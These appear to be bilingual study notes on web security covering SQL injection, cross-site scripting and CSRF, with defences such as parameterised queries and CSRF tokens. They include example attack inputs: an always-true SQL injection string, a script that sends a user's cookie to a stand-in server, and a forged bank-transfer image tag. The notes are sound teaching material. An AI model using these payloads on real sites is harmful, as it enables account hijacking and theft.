# 网络安全

## SQL注入 SQL Injection {#sql注入}

```javascript
txtUserId = getRequestString("UserId");
txtSQL = "SELECT * FROM Users WHERE UserId = " + txtUserId;
```

 Look at the example above again. The original purpose of the code was to create an SQL statement to select a user, with a given user id.

if the user enter 105 OR 1=1

```sql
SELECT * FROM Users WHERE UserId = 105 OR 1=1;
```

 A hacker might get access to all the user names and passwords in a database, by simply inserting 105 OR 1=1 into the input field.

SQL Injection Based on ""="" is Always True  
SQL Injection Based on 1=1 is Always True

To protect a web site from SQL injection, you can use SQL parameters.

### 防御措施

#### Input validation

#### Use SQL Parameters for Protection

The SQL engine checks each parameter to ensure that it is correct for its column and are treated literally, and not as part of the SQL to be executed.

Nodejs sequlize replacement 

```javascript
function findItems(req, resp)
{
  try {
    // Find the relevant items
    sequelize.query(
      "SELECT Desc FROM Items WHERE Desc like ?",
      { replacements: ['%'+req.params.snippet+'%'],
        type: sequelize.QueryTypes.SELECT }
    ) // Retrieve results
    .spread(function(results, metadata) {
        // Add results to response
     });
  } catch {
    // Handle error
  }
}
```

## XXS  跨站脚本攻击 {#firstHeading}

程序员没有对传入的参数做检查，比如提交一个表单

```text
helloworld
<script type=text/javascript>window.location = 
"http://192.168.0.1:8080/cookie.php?cookie="+document.cookie</script>

```

这代码可以将用户的cookie信息上传到指定的服务器

### 防御措施

防范xss的关键是过滤所有的‘&lt;’和‘&gt;’字符，确保从后端而来的数据并不带有任何的html标签，xss的危险在于有不可预料的前端脚本，但是值得注意的是，不单只有script标签是可以运行脚本的，任何的html标签都可以加上类似onclick，onload这样的事件也都可以运行脚本，所以需要过滤所有的‘&lt;’和‘&gt;’字符。

* [Node.js](https://zh.wikipedia.org/wiki/Node.js)的node-validator。

## **CSRF** 跨站请求伪造 {#firstHeading}

 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法

 跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份验证的一个漏洞

假如一家银行用以执行转账操作的URL地址如下： [http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName](http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName)

那么，一个恶意攻击者可以在另一个网站上放置如下代码： &lt;img src="[http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman](http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman)"&gt;

如果有账户名为Alice的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失1000资金。

### 防御措施

#### 检查Referer字段

HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以上文银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于www.examplebank.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于www.examplebank.com之下，这时候服务器就能识别出恶意的访问。

这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。

#### 添加校验token

由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验token的值为空或者错误，拒绝这个可疑请求。

